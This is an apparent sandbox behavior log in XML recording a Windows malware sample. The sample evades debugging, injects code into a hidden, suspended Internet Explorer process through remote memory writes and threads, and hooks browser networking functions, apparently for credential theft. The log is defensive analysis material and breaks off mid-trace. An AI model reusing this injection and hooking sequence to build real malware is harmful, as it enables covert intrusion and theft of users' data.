@@ -1,0 +1,1347 @@
+<?xml version="1.0"?>
+<processes>
+<process index="1" pid="2500" filename="c:\8bb601599f35aac13fb78a3fe64522dd" filename_hash="hash_error" filesize="733184" md5="8bb601599f35aac13fb78a3fe64522dd" sha1="6f5ba3f792f3a6c0c105c0f5c65b429889945601" username="Administrator" parentindex="0" starttime="00:01.844" terminationtime="00:09.922" startreason="AnalysisTarget" terminationreason="NormalTermination" executionstatus="OK" applicationtype="Win32Application">
+<thread tid="2512">
+<all_section>
+<load_image filename="c:\8bb601599f35aac13fb78a3fe64522dd" successful="1" address="&#x24;400000" end_address="&#x24;4B4000" size="737280" filename_hash="hash_error"/>
+<load_dll filename="C:\WINDOWS\system32\ntdll.dll" successful="1" address="&#x24;7C910000" end_address="&#x24;7C9C9000" size="757760" filename_hash="e753d19a2e3b98b2b3b8f02f276092096d10f22d"/>
+<load_dll filename="C:\WINDOWS\system32\kernel32.dll" successful="1" address="&#x24;7C800000" end_address="&#x24;7C908000" size="1081344" filename_hash="c88d57cc99f75cd928b47b6e444231f26670138f"/>
+<load_dll filename="C:\WINDOWS\system32\wininet.dll" successful="1" address="&#x24;441E0000" end_address="&#x24;442B0000" size="851968" filename_hash="b076c231d541b2dd6665f7040a4695bf12d54e7e"/>
+<load_dll filename="C:\WINDOWS\system32\msvcrt.dll" successful="1" address="&#x24;77BE0000" end_address="&#x24;77C38000" size="360448" filename_hash="70d5f97088cc9348bb9d10098af0738a696b96de"/>
+<load_dll filename="C:\WINDOWS\system32\SHLWAPI.dll" successful="1" address="&#x24;77F40000" end_address="&#x24;77FB6000" size="483328" filename_hash="a9245beec2e139b31cd3b65e0f0e4804c030e639"/>
+<load_dll filename="C:\WINDOWS\system32\ADVAPI32.dll" successful="1" address="&#x24;77DA0000" end_address="&#x24;77E4A000" size="696320" filename_hash="ea2e9bac1789b53d7efcd675a63f4a2b44898439"/>
+<load_dll filename="C:\WINDOWS\system32\RPCRT4.dll" successful="1" address="&#x24;77E50000" end_address="&#x24;77EE2000" size="598016" filename_hash="f3bb6474ec18ee9cccc02ef44510a78b42058a41"/>
+<load_dll filename="C:\WINDOWS\system32\Secur32.dll" successful="1" address="&#x24;77FC0000" end_address="&#x24;77FD1000" size="69632" filename_hash="31166d1e35a911a082149f5efac2dac228109615"/>
+<load_dll filename="C:\WINDOWS\system32\GDI32.dll" successful="1" address="&#x24;77EF0000" end_address="&#x24;77F39000" size="299008" filename_hash="0f37018f672c7635691f7317ade3c5a63904ec96"/>
+<load_dll filename="C:\WINDOWS\system32\USER32.dll" successful="1" address="&#x24;7E360000" end_address="&#x24;7E3F1000" size="593920" filename_hash="08fe9ff1fe9b8fd237adedb10d65fb0447b91fe5"/>
+<load_dll filename="C:\WINDOWS\system32\Normaliz.dll" successful="1" address="&#x24;340000" end_address="&#x24;349000" size="36864" filename_hash="ecd1fc4ebcd524aefac77061a8c0b5e4a2a01a8d"/>
+<load_dll filename="C:\WINDOWS\system32\iertutil.dll" successful="1" address="&#x24;43F60000" end_address="&#x24;43FA5000" size="282624" filename_hash="962fdf7a8839794fdb71eb6d15ae0824a89db8d7"/>
+<load_dll filename="C:\WINDOWS\system32\mfc42.dll" successful="1" address="&#x24;73D30000" end_address="&#x24;73E2E000" size="1040384" filename_hash="73d7b3a87aafb4b44f52e4e26864be7cd2762f3e"/>
+<load_dll filename="C:\WINDOWS\WinSxS\X86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\" successful="1" address="&#x24;773A0000" end_address="&#x24;774A3000" size="1060864" filename_hash="hash_error"/>
+<load_dll filename="C:\WINDOWS\system32\IMM32.DLL" successful="1" address="&#x24;76330000" end_address="&#x24;7634D000" size="118784" filename_hash="f9be7678080084bc3cb48d0cb64bba9ba98800f1"/>
+<load_dll filename="C:\WINDOWS\system32\MFC42LOC.DLL" successful="1" address="&#x24;61DC0000" end_address="&#x24;61DCE000" size="57344" filename_hash="hash_error"/>
+<load_dll filename="C:\WINDOWS\system32\oleaut32.dll" successful="1" address="&#x24;770F0000" end_address="&#x24;7717B000" size="569344" filename_hash="3168a173d177f470928b468db777640861dcb32e"/>
+<load_dll filename="C:\WINDOWS\system32\ole32.dll" successful="1" address="&#x24;774B0000" end_address="&#x24;775ED000" size="1298432" filename_hash="c7753525d5276ab92a01a8a3c39cfb5269da7f98"/>
+<load_dll filename="C:\WINDOWS\system32\pstorec.dll" successful="1" address="&#x24;5E490000" end_address="&#x24;5E49D000" size="53248" filename_hash="8ae378a352c4a13516bf1fe5a8615d8893d2ff2d"/>
+<load_dll filename="C:\WINDOWS\system32\ATL.DLL" successful="1" address="&#x24;76AD0000" end_address="&#x24;76AE1000" size="69632" filename_hash="59cb82f432d529da3e81b030b2365c22a95fd35a"/>
+</all_section>
+</thread>
+<thread tid="2504">
+<all_section>
+<get_system_time apifunction="GetLocalTime"/>
+<get_system_time apifunction="GetSystemTime"/>
+<vm_protect targetpid="2500" wantedaddress="&#x24;7E6F11E0" address="&#x24;7E6F1000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="SHELL32.dll.ShellExecuteA"/>
+<vm_protect targetpid="2500" wantedaddress="&#x24;7E6F11E0" address="&#x24;7E6F1000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="SHELL32.dll.ShellExecuteA"/>
+<vm_protect targetpid="2500" wantedaddress="&#x24;7E765D48" address="&#x24;7E765000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="SHELL32.dll.ShellExecuteW"/>
+<vm_protect targetpid="2500" wantedaddress="&#x24;7E765D48" address="&#x24;7E765000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="SHELL32.dll.ShellExecuteW"/>
+<vm_protect targetpid="2500" wantedaddress="&#x24;7E6B996B" address="&#x24;7E6B9000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="SHELL32.dll.ShellExecuteExW"/>
+<vm_protect targetpid="2500" wantedaddress="&#x24;7E6B996B" address="&#x24;7E6B9000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="SHELL32.dll.ShellExecuteExW"/>
+<vm_protect targetpid="2500" wantedaddress="&#x24;7E6F0EB5" address="&#x24;7E6F0000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="SHELL32.dll.ShellExecuteEx"/>
+<vm_protect targetpid="2500" wantedaddress="&#x24;7E6F0EB5" address="&#x24;7E6F0000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="SHELL32.dll.ShellExecuteEx"/>
+<vm_protect targetpid="2500" wantedaddress="&#x24;7E77410F" address="&#x24;7E774000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="SHELL32.dll.SHLoadInProc"/>
+<vm_protect targetpid="2500" wantedaddress="&#x24;7E77410F" address="&#x24;7E774000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="SHELL32.dll.SHLoadInProc"/>
+<load_dll filename="C:\WINDOWS\system32\shell32.dll" successful="1" address="&#x24;7E670000" end_address="&#x24;7EE91000" size="8523776" filename_hash="bbe9d57955e5d348e664b72faf331a7b9d722d0c"/>
+<load_dll filename="C:\WINDOWS\system32\ole32.dll" successful="1" address="&#x24;774B0000" end_address="&#x24;775ED000" size="1298432" filename_hash="c7753525d5276ab92a01a8a3c39cfb5269da7f98"/>
+<load_dll filename="C:\WINDOWS\system32\Ws2_32.dll" successful="1" address="&#x24;71A10000" end_address="&#x24;71A27000" size="94208" filename_hash="7cf3366c68e402eb3678046fe97651a586044560"/>
+<load_dll filename="C:\WINDOWS\system32\VERSION.dll" successful="1" address="&#x24;77BD0000" end_address="&#x24;77BD8000" size="32768" filename_hash="adf263b658136ccb3cde72d0e6dd634c5a5e5143"/>
+<load_dll filename="C:\WINDOWS\system32\oleaut32.dll" successful="1" address="&#x24;770F0000" end_address="&#x24;7717B000" size="569344" filename_hash="3168a173d177f470928b468db777640861dcb32e"/>
+<load_dll filename="C:\WINDOWS\system32\GDI32.dll" successful="1" address="&#x24;77EF0000" end_address="&#x24;77F39000" size="299008" filename_hash="0f37018f672c7635691f7317ade3c5a63904ec96"/>
+<load_dll filename="C:\WINDOWS\system32\kernel32.dll" successful="1" address="&#x24;7C800000" end_address="&#x24;7C908000" size="1081344" filename_hash="c88d57cc99f75cd928b47b6e444231f26670138f"/>
+<load_dll filename="C:\WINDOWS\system32\USER32.dll" successful="1" address="&#x24;7E360000" end_address="&#x24;7E3F1000" size="593920" filename_hash="08fe9ff1fe9b8fd237adedb10d65fb0447b91fe5"/>
+<load_dll filename="C:\WINDOWS\system32\ntdll.dll" successful="1" address="&#x24;7C910000" end_address="&#x24;7C9C9000" size="757760" filename_hash="e753d19a2e3b98b2b3b8f02f276092096d10f22d"/>
+<load_dll filename="C:\WINDOWS\system32\SHLWAPI.dll" successful="1" address="&#x24;77F40000" end_address="&#x24;77FB6000" size="483328" filename_hash="a9245beec2e139b31cd3b65e0f0e4804c030e639"/>
+<load_dll filename="C:\WINDOWS\system32\ADVAPI32.dll" successful="1" address="&#x24;77DA0000" end_address="&#x24;77E4A000" size="696320" filename_hash="ea2e9bac1789b53d7efcd675a63f4a2b44898439"/>
+<load_dll filename="C:\WINDOWS\system32\ntdll.dll" successful="1" address="&#x24;7C910000" end_address="&#x24;7C9C9000" size="757760" filename_hash="e753d19a2e3b98b2b3b8f02f276092096d10f22d"/>
+<check_for_debugger apifunction="IsDebuggerPresent"/>
+<load_dll filename="C:\WINDOWS\system32\uxtheme.dll" successful="1" address="&#x24;5B0F0000" end_address="&#x24;5B128000" size="229376" filename_hash="16c4d24a172bfbc67f488d6b4086b9e10f8eaf4b"/>
+<get_system_directory/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\Compatibility\8bb601599f35aac13fb78a3fe64522dd"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\SystemShared"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\SystemShared" value="CUAS"/>
+<create_mutex name="CTF.LBES.MutexDefaultS-1-5-21-583907252-1708537768-842925246-500" owned="0"/>
+<create_mutex name="CTF.Compart.MutexDefaultS-1-5-21-583907252-1708537768-842925246-500" owned="0"/>
+<create_mutex name="CTF.Asm.MutexDefaultS-1-5-21-583907252-1708537768-842925246-500" owned="0"/>
+<create_mutex name="CTF.Layouts.MutexDefaultS-1-5-21-583907252-1708537768-842925246-500" owned="0"/>
+<create_mutex name="CTF.TMD.MutexDefaultS-1-5-21-583907252-1708537768-842925246-500" owned="0"/>
+<open_key key="HKEY_CURRENT_USER\Keyboard Layout\Toggle"/>
+<query_value key="HKEY_CURRENT_USER\Keyboard Layout\Toggle" value="Language Hotkey"/>
+<query_value key="HKEY_CURRENT_USER\Keyboard Layout\Toggle" value="Layout Hotkey"/>
+<get_system_directory/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF" value="EnableAnchorContext"/>
+<create_mutex name="CTF.TimListCache.FMPDefaultS-1-5-21-583907252-1708537768-842925246-500MUTEX.DefaultS-1-5-21-583907252" owned="0"/>
+<set_windows_hook hookid="WH_KEYBOARD" threadid="2504" hook_address="&#x24;746B07C3" hook_module="&#x24;746A0000"/>
+<set_windows_hook hookid="WH_MOUSE" threadid="2504" hook_address="&#x24;746B04CD" hook_module="&#x24;746A0000"/>
+<create_window hwnd="&#x24;00020194" classname="OleMainThreadWndClass" windowname="OleMainThreadWndName" height="0" width="0" top="0" left="0" style="WS_DISABLED WS_OVERLAPPED WS_POPUP WS_TILED" exstyle="WS_EX_LEFT WS_EX_LTRREADING WS_EX_RIGHTSCROLLBAR"/>
+<open_key key="HKEY_CLASSES_ROOT\InternetExplorer.Application"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\InternetExplorer.Application" value="CLSID" data="&#x7B;0002DF01-0000-0000-C000-000000000046&#x7D;"/>
+<open_key key="HKEY_CLASSES_ROOT\CLSID\&#x7B;0002DF01-0000-0000-C000-000000000046&#x7D;"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#x7B;0002DF01-0000-0000-C000-000000000046&#x7D;" value="LocalServer32" data="&#x22;C:\Programme\Internet Explorer\iexplore.exe&#x22;"/>
+<open_key key="HKEY_CLASSES_ROOT\InternetExplorer.Application"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\InternetExplorer.Application" value="CLSID" data="&#x7B;0002DF01-0000-0000-C000-000000000046&#x7D;"/>
+<open_key key="HKEY_CLASSES_ROOT\CLSID\&#x7B;0002DF01-0000-0000-C000-000000000046&#x7D;"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#x7B;0002DF01-0000-0000-C000-000000000046&#x7D;" value="LocalServer32" data="&#x22;C:\Programme\Internet Explorer\iexplore.exe&#x22;"/>
+<create_process filename="C:\Programme\Internet Explorer\iexplore.exe" filename_hash="hash_error" targetpid="2568" creationflags="CREATE_SUSPENDED" showwindow="SW_HIDE" apifunction="CreateProcessA" successful="1"/>
+<open_file filetype="file" srcfile="c:\8bb601599f35aac13fb78a3fe64522dd" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<vm_allocate targetpid="2568" wantedaddress="&#x24;00000000" address="&#x24;00140000" wantedsize="737280" size="737280" protect="PAGE_EXECUTE_READWRITE" allocationtype="MEM_COMMIT"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;00140000" address="&#x24;00140000" wantedsize="737280" size="737280" protect="PAGE_EXECUTE_READWRITE" behavior="Normal"/>
+<vm_write targetpid="2568" address="&#x24;00140000" size="737280" behavior="Normal"/>
+<vm_allocate targetpid="2568" wantedaddress="&#x24;00000000" address="&#x24;00200000" wantedsize="263" size="4096" protect="PAGE_EXECUTE_READWRITE" allocationtype="MEM_COMMIT"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;00200000" address="&#x24;00200000" wantedsize="12" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;00200000" address="&#x24;00200000" wantedsize="4096" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal"/>
+<vm_write targetpid="2568" address="&#x24;00200000" size="12" behavior="Normal"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;0020000C" address="&#x24;00200000" wantedsize="251" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;00200000" address="&#x24;00200000" wantedsize="4096" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal"/>
+<vm_write targetpid="2568" address="&#x24;0020000C" size="251" behavior="Normal"/>
+<vm_allocate targetpid="2568" wantedaddress="&#x24;00000000" address="&#x24;00210000" wantedsize="76852" size="77824" protect="PAGE_EXECUTE_READWRITE" allocationtype="MEM_COMMIT"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;00210000" address="&#x24;00210000" wantedsize="76852" size="77824" protect="PAGE_EXECUTE_READWRITE" behavior="Normal"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;00210000" address="&#x24;00210000" wantedsize="77824" size="77824" protect="PAGE_EXECUTE_READWRITE" behavior="Normal"/>
+<vm_write targetpid="2568" address="&#x24;00210000" size="76852" behavior="Normal"/>
+<vm_allocate targetpid="2568" wantedaddress="&#x24;00000000" address="&#x24;00230000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" allocationtype="MEM_COMMIT"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;00230000" address="&#x24;00230000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;00230000" address="&#x24;00230000" wantedsize="4096" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal"/>
+<vm_write targetpid="2568" address="&#x24;00230000" size="8" behavior="Normal"/>
+<vm_allocate targetpid="2568" wantedaddress="&#x24;00000000" address="&#x24;00240000" wantedsize="1048576" size="1048576" protect="PAGE_READWRITE" allocationtype="MEM_RESERVE"/>
+<vm_allocate targetpid="2568" wantedaddress="&#x24;0024A000" address="&#x24;0024A000" wantedsize="1007616" size="1007616" protect="PAGE_READWRITE" allocationtype="MEM_COMMIT"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;0024A000" address="&#x24;0024A000" wantedsize="4096" size="4096" protect="PAGE_READWRITE PAGE_GUARD" behavior="Normal"/>
+<create_thread_remote targetpid="2568" threadid="2584" address="&#x24;0020000C" parameteraddress="&#x24;00230000" creationflags="CREATE_SUSPENDED"/>
+<vm_allocate targetpid="2568" wantedaddress="&#x24;00000000" address="&#x24;01320000" wantedsize="16777216" size="16777216" protect="PAGE_READWRITE" allocationtype="MEM_RESERVE"/>
+<vm_allocate targetpid="2568" wantedaddress="&#x24;013DC000" address="&#x24;013DC000" wantedsize="16007168" size="16007168" protect="PAGE_READWRITE" allocationtype="MEM_COMMIT"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;013DC000" address="&#x24;013DC000" wantedsize="4096" size="4096" protect="PAGE_READWRITE PAGE_GUARD" behavior="Normal"/>
+<create_thread_remote targetpid="2568" threadid="2692" address="&#x24;0014EF06" parameteraddress="&#x24;00000000" creationflags="CREATE_SUSPENDED"/>
+<enum_window/>
+<kill_process targetpid="2500" apifunction="NtTerminateProcess"/>
+<enum_window/>
+</all_section>
+</thread>
+</process>
+<process index="2" pid="2568" filename="C:\Programme\Internet Explorer\iexplore.exe" filename_hash="hash_error" filesize="636072" md5="a251068640ddb69fd7805b57d89d7ff7" sha1="c7c97a64d3c27eb942b1ee359ee0743cba31031a" username="Administrator" parentindex="1" starttime="00:05.500" terminationtime="02:01.312" startreason="CreateProcess" terminationreason="Timeout" executionstatus="OK">
+<thread tid="2584">
+<all_section>
+<load_image filename="C:\Programme\Internet Explorer\iexplore.exe" successful="1" address="&#x24;400000" end_address="&#x24;49C000" size="638976" filename_hash="hash_error"/>
+<load_dll filename="C:\WINDOWS\system32\ntdll.dll" successful="1" address="&#x24;7C910000" end_address="&#x24;7C9C9000" size="757760" filename_hash="e753d19a2e3b98b2b3b8f02f276092096d10f22d"/>
+<load_dll filename="C:\WINDOWS\system32\kernel32.dll" successful="1" address="&#x24;7C800000" end_address="&#x24;7C908000" size="1081344" filename_hash="c88d57cc99f75cd928b47b6e444231f26670138f"/>
+<load_dll filename="C:\WINDOWS\system32\ADVAPI32.dll" successful="1" address="&#x24;77DA0000" end_address="&#x24;77E4A000" size="696320" filename_hash="ea2e9bac1789b53d7efcd675a63f4a2b44898439"/>
+<load_dll filename="C:\WINDOWS\system32\RPCRT4.dll" successful="1" address="&#x24;77E50000" end_address="&#x24;77EE2000" size="598016" filename_hash="f3bb6474ec18ee9cccc02ef44510a78b42058a41"/>
+<load_dll filename="C:\WINDOWS\system32\Secur32.dll" successful="1" address="&#x24;77FC0000" end_address="&#x24;77FD1000" size="69632" filename_hash="31166d1e35a911a082149f5efac2dac228109615"/>
+<load_dll filename="C:\WINDOWS\system32\GDI32.dll" successful="1" address="&#x24;77EF0000" end_address="&#x24;77F39000" size="299008" filename_hash="0f37018f672c7635691f7317ade3c5a63904ec96"/>
+<load_dll filename="C:\WINDOWS\system32\USER32.dll" successful="1" address="&#x24;7E360000" end_address="&#x24;7E3F1000" size="593920" filename_hash="08fe9ff1fe9b8fd237adedb10d65fb0447b91fe5"/>
+<load_dll filename="C:\WINDOWS\system32\msvcrt.dll" successful="1" address="&#x24;77BE0000" end_address="&#x24;77C38000" size="360448" filename_hash="70d5f97088cc9348bb9d10098af0738a696b96de"/>
+<load_dll filename="C:\WINDOWS\system32\SHLWAPI.dll" successful="1" address="&#x24;77F40000" end_address="&#x24;77FB6000" size="483328" filename_hash="a9245beec2e139b31cd3b65e0f0e4804c030e639"/>
+<load_dll filename="C:\WINDOWS\system32\SHELL32.dll" successful="1" address="&#x24;7E670000" end_address="&#x24;7EE91000" size="8523776" filename_hash="bbe9d57955e5d348e664b72faf331a7b9d722d0c"/>
+<load_dll filename="C:\WINDOWS\system32\ole32.dll" successful="1" address="&#x24;774B0000" end_address="&#x24;775ED000" size="1298432" filename_hash="c7753525d5276ab92a01a8a3c39cfb5269da7f98"/>
+<load_dll filename="C:\WINDOWS\system32\urlmon.dll" successful="1" address="&#x24;452E0000" end_address="&#x24;45407000" size="1208320" filename_hash="d1fe6e0c349d546f931a4654415e648f30ed91cb"/>
+<load_dll filename="C:\WINDOWS\system32\OLEAUT32.dll" successful="1" address="&#x24;770F0000" end_address="&#x24;7717B000" size="569344" filename_hash="3168a173d177f470928b468db777640861dcb32e"/>
+<load_dll filename="C:\WINDOWS\system32\iertutil.dll" successful="1" address="&#x24;43F60000" end_address="&#x24;43FA5000" size="282624" filename_hash="962fdf7a8839794fdb71eb6d15ae0824a89db8d7"/>
+<load_dll filename="C:\WINDOWS\system32\VERSION.dll" successful="1" address="&#x24;77BD0000" end_address="&#x24;77BD8000" size="32768" filename_hash="adf263b658136ccb3cde72d0e6dd634c5a5e5143"/>
+<load_dll filename="C:\WINDOWS\system32\IMM32.DLL" successful="1" address="&#x24;76330000" end_address="&#x24;7634D000" size="118784" filename_hash="f9be7678080084bc3cb48d0cb64bba9ba98800f1"/>
+<load_dll filename="C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\" successful="1" address="&#x24;773A0000" end_address="&#x24;774A3000" size="1060864" filename_hash="hash_error"/>
+<load_dll filename="C:\WINDOWS\system32\comctl32.dll" successful="1" address="&#x24;5D450000" end_address="&#x24;5D4EA000" size="630784" filename_hash="ba126572bcb4ac594a3c37e2ac86db40b173878d"/>
+<load_dll filename="C:\WINDOWS\system32\pstorec.dll" successful="1" address="&#x24;5E490000" end_address="&#x24;5E49D000" size="53248" filename_hash="8ae378a352c4a13516bf1fe5a8615d8893d2ff2d"/>
+<load_dll filename="C:\WINDOWS\system32\ATL.DLL" successful="1" address="&#x24;76AD0000" end_address="&#x24;76AE1000" size="69632" filename_hash="59cb82f432d529da3e81b030b2365c22a95fd35a"/>
+<create_thread targetpid="2568" threadid="2684" address="&#x24;77DC848A" parameteraddress="&#x24;00000000"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;44200BCA" address="&#x24;44200000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WININET.dll.InternetOpenUrlA"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;44200BCA" address="&#x24;44200000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WININET.dll.InternetOpenUrlA"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;4424AF69" address="&#x24;4424A000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WININET.dll.InternetOpenUrlW"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;4424AF69" address="&#x24;4424A000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WININET.dll.InternetOpenUrlW"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;441F4321" address="&#x24;441F4000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WININET.dll.HttpOpenRequestA"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;441F4321" address="&#x24;441F4000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WININET.dll.HttpOpenRequestA"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;441F5D42" address="&#x24;441F5000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WININET.dll.HttpOpenRequestW"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;441F5D42" address="&#x24;441F5000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WININET.dll.HttpOpenRequestW"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;441F497A" address="&#x24;441F4000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WININET.dll.InternetConnectA"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;441F497A" address="&#x24;441F4000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WININET.dll.InternetConnectA"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;441F5B68" address="&#x24;441F5000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WININET.dll.InternetConnectW"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;441F5B68" address="&#x24;441F5000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WININET.dll.InternetConnectW"/>
+<load_dll filename="C:\WINDOWS\system32\wininet.dll" successful="1" address="&#x24;441E0000" end_address="&#x24;442B0000" size="851968" filename_hash="b076c231d541b2dd6665f7040a4695bf12d54e7e"/>
+<load_dll filename="C:\WINDOWS\system32\USER32.dll" successful="1" address="&#x24;7E360000" end_address="&#x24;7E3F1000" size="593920" filename_hash="08fe9ff1fe9b8fd237adedb10d65fb0447b91fe5"/>
+<load_dll filename="C:\WINDOWS\system32\msvcrt.dll" successful="1" address="&#x24;77BE0000" end_address="&#x24;77C38000" size="360448" filename_hash="70d5f97088cc9348bb9d10098af0738a696b96de"/>
+<get_system_directory/>
+<load_dll filename="C:\WINDOWS\system32\MFC42LOC.DLL" successful="1" address="&#x24;B60000" end_address="&#x24;B6E000" size="57344" filename_hash="hash_error"/>
+<load_dll filename="C:\WINDOWS\system32\mfc42.dll" successful="1" address="&#x24;73D30000" end_address="&#x24;73E2E000" size="1040384" filename_hash="73d7b3a87aafb4b44f52e4e26864be7cd2762f3e"/>
+<load_dll filename="C:\WINDOWS\system32\ADVAPI32.dll" successful="1" address="&#x24;77DA0000" end_address="&#x24;77E4A000" size="696320" filename_hash="ea2e9bac1789b53d7efcd675a63f4a2b44898439"/>
+<load_dll filename="C:\WINDOWS\system32\GDI32.dll" successful="1" address="&#x24;77EF0000" end_address="&#x24;77F39000" size="299008" filename_hash="0f37018f672c7635691f7317ade3c5a63904ec96"/>
+<load_dll filename="C:\WINDOWS\system32\kernel32.dll" successful="1" address="&#x24;7C800000" end_address="&#x24;7C908000" size="1081344" filename_hash="c88d57cc99f75cd928b47b6e444231f26670138f"/>
+<load_dll filename="C:\WINDOWS\system32\comctl32.dll" successful="1" address="&#x24;5D450000" end_address="&#x24;5D4EA000" size="630784" filename_hash="ba126572bcb4ac594a3c37e2ac86db40b173878d"/>
+</all_section>
+</thread>
+<thread tid="2692">
+<all_section>
+<get_system_time apifunction="GetLocalTime"/>
+<get_system_time apifunction="GetSystemTime"/>
+<load_dll filename="C:\WINDOWS\system32\SHELL32.dll" successful="1" address="&#x24;7E670000" end_address="&#x24;7EE91000" size="8523776" filename_hash="bbe9d57955e5d348e664b72faf331a7b9d722d0c"/>
+<load_dll filename="C:\WINDOWS\system32\ole32.dll" successful="1" address="&#x24;774B0000" end_address="&#x24;775ED000" size="1298432" filename_hash="c7753525d5276ab92a01a8a3c39cfb5269da7f98"/>
+<load_dll filename="C:\WINDOWS\system32\Ws2_32.dll" successful="1" address="&#x24;71A10000" end_address="&#x24;71A27000" size="94208" filename_hash="7cf3366c68e402eb3678046fe97651a586044560"/>
+<load_dll filename="C:\WINDOWS\system32\VERSION.dll" successful="1" address="&#x24;77BD0000" end_address="&#x24;77BD8000" size="32768" filename_hash="adf263b658136ccb3cde72d0e6dd634c5a5e5143"/>
+<load_dll filename="C:\WINDOWS\system32\OLEAUT32.dll" successful="1" address="&#x24;770F0000" end_address="&#x24;7717B000" size="569344" filename_hash="3168a173d177f470928b468db777640861dcb32e"/>
+<load_dll filename="C:\WINDOWS\system32\GDI32.dll" successful="1" address="&#x24;77EF0000" end_address="&#x24;77F39000" size="299008" filename_hash="0f37018f672c7635691f7317ade3c5a63904ec96"/>
+<load_dll filename="C:\WINDOWS\system32\kernel32.dll" successful="1" address="&#x24;7C800000" end_address="&#x24;7C908000" size="1081344" filename_hash="c88d57cc99f75cd928b47b6e444231f26670138f"/>
+<load_dll filename="C:\WINDOWS\system32\USER32.dll" successful="1" address="&#x24;7E360000" end_address="&#x24;7E3F1000" size="593920" filename_hash="08fe9ff1fe9b8fd237adedb10d65fb0447b91fe5"/>
+<load_dll filename="C:\WINDOWS\system32\ntdll.dll" successful="1" address="&#x24;7C910000" end_address="&#x24;7C9C9000" size="757760" filename_hash="e753d19a2e3b98b2b3b8f02f276092096d10f22d"/>
+<load_dll filename="C:\WINDOWS\system32\SHLWAPI.dll" successful="1" address="&#x24;77F40000" end_address="&#x24;77FB6000" size="483328" filename_hash="a9245beec2e139b31cd3b65e0f0e4804c030e639"/>
+<load_dll filename="C:\WINDOWS\system32\ADVAPI32.dll" successful="1" address="&#x24;77DA0000" end_address="&#x24;77E4A000" size="696320" filename_hash="ea2e9bac1789b53d7efcd675a63f4a2b44898439"/>
